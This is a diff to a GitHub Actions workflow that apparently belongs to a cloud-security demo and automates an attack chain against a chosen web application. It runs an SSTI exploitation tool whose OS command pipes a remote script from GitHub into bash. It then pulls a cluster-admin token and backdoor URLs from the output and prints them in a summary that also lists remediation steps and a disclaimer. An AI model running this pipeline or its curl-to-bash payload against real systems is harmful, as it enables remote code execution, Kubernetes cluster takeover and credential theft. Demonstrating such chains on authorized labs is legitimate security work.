@@ -1,16 +1,12 @@
 name: Attack_WebApp-Container-Escape
 
 on:
-  # push:
-  #  branches:
-  #    - main
   workflow_dispatch:
     inputs:
       APP_URL:
         description: 'URL of the web application to attack'
         required: true
         default: '<CHANGE ME>'
-
 
 jobs:
     attack-job:
@@ -21,7 +17,244 @@ jobs:
               uses: actions/checkout@v3
 
             - name: Run Full Attack
+              id: attack
               run: |
-                docker run chrisley75/sstimap:1.0.3 \
+                # Capture l'output complet
+                OUTPUT=$(docker run chrisley75/sstimap:1.0.3 \
                   -u "${{ github.event.inputs.APP_URL }}page?name=attack" \
-                  --os-cmd "curl -s https://raw.githubusercontent.com/cortex-cloud-demo/4-webapp-attack-demo/refs/heads/main/vul-app/scripts/cloudlabs-full-attack.sh | bash"
+                  --os-cmd "curl -s https://raw.githubusercontent.com/cortex-cloud-demo/4-webapp-attack-demo/refs/heads/main/vul-app/scripts/cloudlabs-full-attack.sh | bash" 2>&1)
+                
+                echo "$OUTPUT"
+                
+                # Extraire les informations importantes
+                HACKED_URL=$(echo "$OUTPUT" | grep "Hacked Application URL is:" | awk '{print $NF}')
+                DASHBOARD_URL=$(echo "$OUTPUT" | grep "Kubernetes Dashboard URL is:" | awk '{print $NF}')
+                TOKEN=$(echo "$OUTPUT" | grep -A 1 "Cluster Admin Token is" | tail -n 1)
+                
+                # Sauvegarder dans les outputs
+                echo "hacked_url=$HACKED_URL" >> $GITHUB_OUTPUT
+                echo "dashboard_url=$DASHBOARD_URL" >> $GITHUB_OUTPUT
+                echo "token=$TOKEN" >> $GITHUB_OUTPUT
+                
+                # Sauvegarder l'output complet pour le summary
+                echo "$OUTPUT" > attack_output.log
+
+            - name: Generate Attack Summary
+              if: always()
+              run: |
+                # Lire l'output
+                OUTPUT=$(cat attack_output.log 2>/dev/null || echo "No output captured")
+                
+                # Extraire les URLs et token
+                HACKED_URL="${{ steps.attack.outputs.hacked_url }}"
+                DASHBOARD_URL="${{ steps.attack.outputs.dashboard_url }}"
+                TOKEN="${{ steps.attack.outputs.token }}"
+                
+                # Créer le GitHub Summary
+                cat >> $GITHUB_STEP_SUMMARY << 'EOF'
+                # 🎯 Security Test Results
+                
+                ## ⚠️ Attack Summary
+                
+                **Target Application:** `${{ github.event.inputs.APP_URL }}`
+                
+                **Execution Time:** `$(date -u +"%Y-%m-%d %H:%M:%S UTC")`
+                
+                **Status:** ✅ Attack Chain Completed
+                
+                ---
+                
+                ## 🔓 Compromised Resources
+                
+                ### 1. Container Escape
+                ```
+                ✓ SSTI Vulnerability Exploited
+                ✓ Remote Code Execution Achieved
+                ✓ Container Breakout Successful
+                ✓ Kubernetes API Access Gained
+                ```
+                
+                ### 2. Deployed Backdoors
+                
+                | Resource | Type | Status |
+                |----------|------|--------|
+                | Kubernetes Dashboard | Namespace | ✅ Deployed |
+                | Hacked Application | Namespace | ✅ Deployed |
+                | ServiceAccount | cluster-admin-sa | ✅ Created |
+                | LoadBalancers | AWS ELB | ✅ Exposed |
+                
+                ---
+                
+                ## 🌐 Access Points
+                
+                ### Hacked Application
+                EOF
+                
+                if [ ! -z "$HACKED_URL" ]; then
+                  echo "**URL:** [$HACKED_URL]($HACKED_URL)" >> $GITHUB_STEP_SUMMARY
+                else
+                  echo "**URL:** Not captured" >> $GITHUB_STEP_SUMMARY
+                fi
+                
+                cat >> $GITHUB_STEP_SUMMARY << 'EOF'
+                
+                **Purpose:** Displays cluster information and provides kubectl access instructions
+                
+                ### Kubernetes Dashboard
+                EOF
+                
+                if [ ! -z "$DASHBOARD_URL" ]; then
+                  echo "**URL:** [$DASHBOARD_URL]($DASHBOARD_URL)" >> $GITHUB_STEP_SUMMARY
+                else
+                  echo "**URL:** Not captured" >> $GITHUB_STEP_SUMMARY
+                fi
+                
+                cat >> $GITHUB_STEP_SUMMARY << 'EOF'
+                
+                **Purpose:** Malicious dashboard with cluster-admin privileges
+                
+                ---
+                
+                ## 🔑 Extracted Credentials
+                
+                ### Cluster Admin Token
+                
+                > **⚠️ CRITICAL:** This token provides full cluster-admin access
+                
+                EOF
+                
+                if [ ! -z "$TOKEN" ]; then
+                  echo '```' >> $GITHUB_STEP_SUMMARY
+                  echo "ey$TOKEN" >> $GITHUB_STEP_SUMMARY
+                  echo '```' >> $GITHUB_STEP_SUMMARY
+                  
+                  # Décoder le token pour afficher des infos
+                  echo "" >> $GITHUB_STEP_SUMMARY
+                  echo "**Token Details:**" >> $GITHUB_STEP_SUMMARY
+                  echo '```json' >> $GITHUB_STEP_SUMMARY
+                  echo "ey$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq '.' 2>/dev/null || echo "Token payload (base64 encoded)" >> $GITHUB_STEP_SUMMARY
+                  echo '```' >> $GITHUB_STEP_SUMMARY
+                else
+                  echo "Token not captured in output" >> $GITHUB_STEP_SUMMARY
+                fi
+                
+                cat >> $GITHUB_STEP_SUMMARY << 'EOF'
+                
+                ---
+                
+                ## 🎭 Attack Chain Visualization
+                
+                ```mermaid
+                graph LR
+                    A[Web App SSTI] -->|RCE| B[Container]
+                    B -->|Escape| C[K8s API]
+                    C -->|Create| D[ServiceAccount]
+                    D -->|Extract| E[cluster-admin Token]
+                    C -->|Deploy| F[Backdoor Apps]
+                    F -->|Expose| G[Public LoadBalancers]
+                    E -->|Full Access| H[Cluster Compromise]
+                ```
+                
+                ---
+                
+                ## 📊 Deployed Resources
+                
+                ### Namespaces Created
+                - `kubernetes-dashboard`
+                - `hacked`
+                
+                ### Services Exposed
+                - `kubernetes-dashboard` (LoadBalancer, Port 443)
+                - `hacked-svc` (LoadBalancer, Port 8080)
+                
+                ### Malware Status
+                ```
+                ✓ Download successful
+                ✓ Execution successful
+                ```
+                
+                ---
+                
+                ## 🛡️ Remediation Steps
+                
+                ### Immediate Actions Required
+                
+                1. **Revoke Compromised Token**
+                   ```bash
+                   kubectl delete serviceaccount cluster-admin-sa -n cloudlabs-webapp
+                   ```
+                
+                2. **Delete Malicious Resources**
+                   ```bash
+                   kubectl delete namespace hacked
+                   kubectl delete namespace kubernetes-dashboard
+                   ```
+                
+                3. **Audit Cluster**
+                   ```bash
+                   kubectl get all --all-namespaces
+                   kubectl get secrets --all-namespaces
+                   kubectl get rolebindings,clusterrolebindings --all-namespaces
+                   ```
+                
+                4. **Review CloudTrail/EKS Logs**
+                   ```bash
+                   aws eks describe-cluster --name <cluster-name>
+                   ```
+                
+                5. **Rotate All Credentials**
+                   - ServiceAccount tokens
+                   - IAM roles
+                   - Application secrets
+                
+                ### Security Improvements
+                
+                - [ ] Implement Pod Security Standards (PSS)
+                - [ ] Enable admission controllers (PodSecurity)
+                - [ ] Restrict ServiceAccount permissions (RBAC)
+                - [ ] Network policies to limit egress
+                - [ ] Container runtime security (Falco, AppArmor)
+                - [ ] Regular vulnerability scanning
+                
+                ---
+                
+                ## 📝 Technical Details
+                
+                <details>
+                <summary>Click to view full attack output</summary>
+                
+                ```
+                EOF
+                
+                cat attack_output.log >> $GITHUB_STEP_SUMMARY 2>/dev/null || echo "Output log not available" >> $GITHUB_STEP_SUMMARY
+                
+                cat >> $GITHUB_STEP_SUMMARY << 'EOF'
+                ```
+                
+                </details>
+                
+                ---
+                
+                ## ⚠️ Disclaimer
+                
+                > **This is a security demonstration in a controlled environment.**
+                > 
+                > - This attack should ONLY be performed on authorized test systems
+                > - Never run this against production or unauthorized systems
+                > - Ensure proper cleanup after testing
+                > - All activities are logged and monitored
+                
+                ---
+                
+                **Workflow Run:** `${{ github.run_id }}`  
+                **Triggered by:** `${{ github.actor }}`  
+                **Repository:** `${{ github.repository }}`
+                EOF
+
+            - name: Upload Attack Logs
+              if: always()
+              uses: actions/upload-artifact@v3
+              with:
+                name: attack-logs
+                path: attack_output.log
+                retention-days: 7
